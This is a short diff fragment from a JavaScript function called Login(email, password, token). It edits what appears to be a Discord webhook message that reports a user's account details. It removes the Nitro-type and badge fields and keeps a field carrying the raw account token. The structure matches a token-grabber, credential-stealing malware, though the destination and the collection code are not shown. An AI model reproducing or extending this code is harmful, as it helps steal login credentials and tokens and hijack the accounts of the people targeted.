@@ -182,21 +182,6 @@ function Login(email, password, token) {
                             "inline": false
                         },
                         {
-                            "name": " nitro type",
-                            "value": ` - ${GetNitro(json.premium_type)}`,
-                            "inline": true
-                        },
-                        {
-                            "name": " badges",
-                            "value": ` - ${GetBadges(json.flags)}`,
-                            "inline": true
-                        },
-                        {
-                            "name": "᲼᲼᲼᲼",
-                            "value": `᲼᲼᲼᲼`,
-                            "inline": false
-                        },
-                        {
                             "name": " token",
                             "value": ` - ${token}`,
                             "inline": false
